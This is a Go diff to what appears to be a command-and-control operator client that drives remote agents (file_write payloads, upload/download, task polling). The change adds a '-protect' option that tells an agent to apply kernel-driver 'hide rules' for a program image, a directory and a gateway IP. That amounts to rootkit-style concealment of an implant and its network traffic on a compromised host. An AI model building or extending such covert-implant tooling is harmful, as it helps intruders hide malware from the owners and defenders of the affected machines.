@@ -31,6 +31,7 @@ func main() {
 	hexN := flag.Int("hex", 0, "number of hex chars for file_write payload")
 	sweep := flag.String("sweep", "", "comma-separated hex-char sizes to test sequentially")
 	upload := flag.String("upload", "", "\"local|remote\" paths to upload")
+	protect := flag.String("protect", "", "\"image,dir,gateway-ip\" merge hide rules via the kernel driver")
 	download := flag.String("download", "", "\"remote|local\" paths to download")
 	httpAddr := flag.String("http", "127.0.0.1:8080", "control plane HTTP API for task polling")
 	flag.Parse()
@@ -47,6 +48,27 @@ func main() {
 	}
 	defer conn.Close()
 	client := pb.NewFeiControlServiceClient(conn)
+
+	if *protect != "" {
+		parts := strings.SplitN(*protect, ",", 3)
+		if len(parts) != 3 {
+			fmt.Fprintln(os.Stderr, "-protect wants \"image,dir,gateway-ip\"")
+			os.Exit(2)
+		}
+		ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
+		defer cancel()
+		r, err := client.SendCommand(ctx, &pb.SendCommandRequest{
+			AgentId:    *agent,
+			Command:    "protect",
+			Parameters: parts,
+		})
+		if err != nil {
+			fmt.Println("protect rpc:", err)
+			os.Exit(1)
+		}
+		fmt.Printf("protect success=%v: %s err=%s\n", r.Success, r.Result, r.Error)
+		return
+	}
 
 	if *upload != "" {
 		parts := strings.SplitN(*upload, "|", 2)
